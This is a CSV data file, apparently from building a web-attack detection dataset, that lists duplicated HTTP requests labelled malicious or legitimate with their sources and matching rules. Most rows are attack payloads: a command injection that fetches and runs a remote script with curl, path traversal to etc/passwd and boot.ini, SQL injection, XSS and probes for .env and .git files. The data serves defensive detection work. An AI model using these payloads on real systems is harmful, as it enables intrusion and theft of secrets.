"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"canonical_raw_request_hash","51aa59e308837b906b9895c5","2","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_000440|pos_owasp_modsec_002587","GET","/asp.js",""
"canonical_raw_request_hash","52e5ea7bd5805dd364785de7","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001789|norm_modsec_learn_001180","GET","/","a=135092800&sa=1&v=1215.1253ab8&t=Unnamed%20Transaction&rst=69525&ck=1&ref=https://www.nike.com/il/member/profile/login&ri=%7B%22web-shell-client%22:%221.39.0%22,%22shopClient%22:%221.133.0%22%7D"
"canonical_raw_request_hash","55eccedf499a9d961f6041d6","2","1","owasp_modsecurity","owasp_lfi_rfi:920450|owasp_lfi_rfi:930130","pos_owasp_modsec_002848|pos_owasp_modsec_002415","GET","/.git/config",""
"canonical_raw_request_hash","5ff42fccd0b7b99d003870a0","2","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_000147|pos_owasp_modsec_001610","GET","/d_8fd53753/d_26833b49/d_06c4c830/d_6283da6e/d_a7ea22f1/d_57982a55/d_f7188394/script.min.js",""
"canonical_raw_request_hash","65672c1f7690878081a60baa","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_001006|pos_owasp_modsec_002786","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php",""
"canonical_raw_request_hash","6940ce0172956da23cb52c55","2","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_002456|pos_owasp_modsec_002515","GET","/.env.example",""
"canonical_raw_request_hash","6b96dc17dd5792166f756bdd","2","1","csic_2010","csic_anomalous","pos_csic_001072|pos_csic_000659","GET","/tienda1/global/estilos.css.inc",""
"canonical_raw_request_hash","702d2b4b8a357fe17f6fce0e","2","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_002800|pos_owasp_modsec_002884","GET","/.env.prod",""
"canonical_raw_request_hash","736aaa50207bd2140a29a1b0","2","1","csic_2010","csic_anomalous","pos_csic_001756|pos_csic_002699","GET","/tienda1.inc",""
"canonical_raw_request_hash","7377d46661b580b7652ac8be","2","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001949|pos_owasp_modsec_000132","GET","/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","7619f804d9e288b17312a169","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_000230|pos_owasp_modsec_000761","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php",""
"canonical_raw_request_hash","7830ff6c64332e07acfd7c54","2","1","openappsec_malicious","traversal","pos_malicious_003022|pos_malicious_002998","GET","/","p=..%01%c1%af..%01%c1%af..%01%c1%af..%01%c1%af..%01%c1%af..%01%c1%afboot.ini"
"canonical_raw_request_hash","7be2e39282cba9301a62f68b","2","1","csic_2010","csic_anomalous","pos_csic_001929|pos_csic_001253","GET","/WebSphereSamples/SingleSamples/Increment/increment.html",""
"canonical_raw_request_hash","7f6c3c51d8247d19e3f4166e","2","1","owasp_modsecurity","owasp_lfi_rfi:930130","pos_owasp_modsec_001024|pos_owasp_modsec_000870","GET","/.env",""
"canonical_raw_request_hash","808b68b9d21fb365018a8b11","2","1","csic_2010","csic_anomalous","pos_csic_000306|pos_csic_002519","POST","/tienda1/publico/vaciar.jsp",""
"canonical_raw_request_hash","83c2d6fe536e935191b8e79e","2","1","csic_2010","csic_anomalous","pos_csic_002629|pos_csic_000026","GET","/tienda1/publico/caracteristicas.jsp","id=1%2520"
"canonical_raw_request_hash","87a3ef083316e782765e453d","2","1","csic_2010","csic_anomalous","pos_csic_000120|pos_csic_001738","PUT","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","898aba91ec0a3f8d61ea2c54","2","1","csic_2010","csic_anomalous","pos_csic_002546|pos_csic_001464","GET","/4861362529278789730",""
"canonical_raw_request_hash","8f77cc77d97b5ac06a37a8b5","2","1","csic_2010","csic_anomalous","pos_csic_001571|pos_csic_002725","GET","/",""
"canonical_raw_request_hash","8f9054b12e505efd2fb136b3","2","1","csic_2010","csic_anomalous","pos_csic_001523|pos_csic_001551","GET","/tienda1/publico/vaciar.jsp","B2=%2520"
"canonical_raw_request_hash","9186324ee36123729f65a578","2","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_001897|pos_owasp_modsec_002459","POST","/","wc-ajax=add_to_cart"
"canonical_raw_request_hash","92a410d34093750121c1ec57","2","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_000251|pos_owasp_modsec_000224","GET","/wordpress/.git/config",""
"canonical_raw_request_hash","996463a2144af119488e4380","2","0","csic_2010","csic_normal","norm_csic_002635|norm_csic_001805","POST","/tienda1/publico/anadir.jsp",""
"canonical_raw_request_hash","9c1c1c02e2b63906c13e913c","2","1","owasp_modsecurity","owasp_lfi_rfi:930130","pos_owasp_modsec_001448|pos_owasp_modsec_001512","GET","/.env",""
"canonical_raw_request_hash","9d34e68a2f74ab9aace54946","2","1","csic_2010","csic_anomalous","pos_csic_000984|pos_csic_002861","GET","/tienda1/asf-logo-wide.gif/",""
"canonical_raw_request_hash","a378e224b74742fda2b31994","2","1","openappsec_malicious","traversal","pos_malicious_002506|pos_malicious_002378","GET","/","p=.%00.%c1%af.%00.%c1%af.%00.%c1%afetc%c1%afpasswd"
"canonical_raw_request_hash","a48c2b80d2f6051e68555e3f","2","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_001222|pos_owasp_modsec_002447","GET","/api/.env",""
"canonical_raw_request_hash","a75159c2a3fe04095e06984d","2","1","csic_2010","csic_anomalous|csic_xss","pos_csic_001708|pos_csic_000190","GET","/tienda1/publico/vaciar.jsp","B2=Vaciar+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E"
"canonical_raw_request_hash","a82071bf4c5a8ad64e35339b","2","1","csic_2010","csic_anomalous|csic_xss","pos_csic_001489|pos_csic_001907","GET","/tienda1/publico/vaciar.jsp","B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org"
"canonical_raw_request_hash","b29c320859beab99920205ad","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002743|norm_modsec_learn_002974","GET","/","stm=1662447989854"
"canonical_raw_request_hash","b86ada97c12960e925d72693","2","1","owasp_modsecurity","owasp_php_injection:933100","pos_owasp_modsec_001034|pos_owasp_modsec_002006","POST","/wp-login.php",""
"canonical_raw_request_hash","be7faa64ab3255fc311a82ec","2","1","csic_2010","csic_anomalous|csic_xss","pos_csic_002235|pos_csic_001674","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","c111a6b469efa586bcf87bf1","2","1","csic_2010","csic_crlf","pos_csic_002287|pos_csic_000684","POST","/tienda1/publico/entrar.jsp",""
"canonical_raw_request_hash","c27f91a632efe0101ca71fff","2","1","openappsec_malicious","sqli","pos_malicious_001342|pos_malicious_001335","GET","/","p=1%20uNIoN%28sEleCT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29"
"canonical_raw_request_hash","c72543e9c8b2731cfb7af1e4","2","1","csic_2010","csic_anomalous","pos_csic_001445|pos_csic_002553","GET","/tienda1/global/estilos.css.Old",""
"canonical_raw_request_hash","d166325a369f1e2d71b26499","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_000312|pos_owasp_modsec_000201","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php.suspected",""
"canonical_raw_request_hash","d332bc301f24f7855846c6f6","2","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_002345|pos_owasp_modsec_001745","POST","/wp-plain.php",""
"canonical_raw_request_hash","d4aa33e081ccb6bf99a55c9d","2","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_001803|pos_owasp_modsec_002961","POST","/contactus.php",""
"canonical_raw_request_hash","d7f19fc0491e30f31dbd4349","2","1","csic_2010","csic_anomalous","pos_csic_000767|pos_csic_001491","GET","/tienda1/publico/entrar.jsp","errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--"
"canonical_raw_request_hash","d91aadcddc0c4d1f966d0c23","2","1","csic_2010","csic_anomalous","pos_csic_001003|pos_csic_000865","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","db94e92d7515e6eb3ac14b04","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002388|norm_modsec_learn_000090","GET","/","cb=31068870"
"canonical_raw_request_hash","de000d1bb91744c0b196d517","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_001667|pos_owasp_modsec_001480","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php",""
"canonical_raw_request_hash","e338d2a2e1f123c8bd4fff8b","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_001106|pos_owasp_modsec_002803","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php.suspected",""
"canonical_raw_request_hash","e70e64ab742cacd55d64b0ec","2","1","openappsec_malicious","traversal","pos_malicious_002488|pos_malicious_002512","GET","/","p=.%00.%c1%9cboot.ini"
"canonical_raw_request_hash","e812a3145dc8bdd270982a33","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001101|norm_modsec_learn_002861","GET","/","v=9-32680a36db&secure=1&cachedVariantChoices=W10-&isPurposePreview=0&eventMetadataExperiment=newMeta&inmobi=0"
"canonical_raw_request_hash","ee8c8b5e6c56829878e35eb0","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002958|norm_modsec_learn_000266","GET","/","name=1658754074794&target=OPTIMIZATION_TARGET_LANGUAGE_DETECTION"
"canonical_raw_request_hash","f7c51f18f65ddce22abdb2a1","2","1","openappsec_malicious","traversal","pos_malicious_003040|pos_malicious_002912","GET","/","p=..%01%c1%af..%01%c1%afetc%c1%afpasswd"
"canonical_raw_request_hash","f862a685a1c484956aecc561","2","1","exploitdb","lfi","pos_luongvd_000879|pos_luongvd_000880","GET","/foobar/..\..\..\..\..\..\boot.ini",""
"canonical_raw_request_hash","f8cb8aeac21e9798dc42b175","2","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_002204|pos_owasp_modsec_000309","GET","/ogqrfwnp.php","Fox=d3wL7"
"canonical_raw_request_hash","f8e69af1aea75593166bf8b2","2","1","owasp_modsecurity","owasp_php_injection:933100|owasp_sqli:942100","pos_owasp_modsec_000134|pos_owasp_modsec_002294","POST","/wp-login.php",""
"canonical_raw_request_hash","f960ba264ad6165ea39b874e","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001791|norm_modsec_learn_001183","GET","/","a=138609390&sa=1&v=1215.1253ab8&t=Unnamed%20Transaction&rst=4116&ck=1&ref=https://www.nike.com/il/cart&be=639&fe=4079&dc=1322&af=err,xhr,stn,ins,spa&perf=%7B%22timing%22:%7B%22of%22:1660541229141,%22n%22:0,%22u%22:616,%22ue%22:616,%22f%22:2,%22dn%22:2,%22dne%22:2,%22c%22:6,%22s%22:325,%22ce%22:327,%"
"canonical_raw_request_hash","fc1ade207236f1f648bb5c7c","2","1","openappsec_malicious","traversal","pos_malicious_002911|pos_malicious_003015","GET","/","p=..%01%c0%af..%01%c0%afetc%c0%afissue"
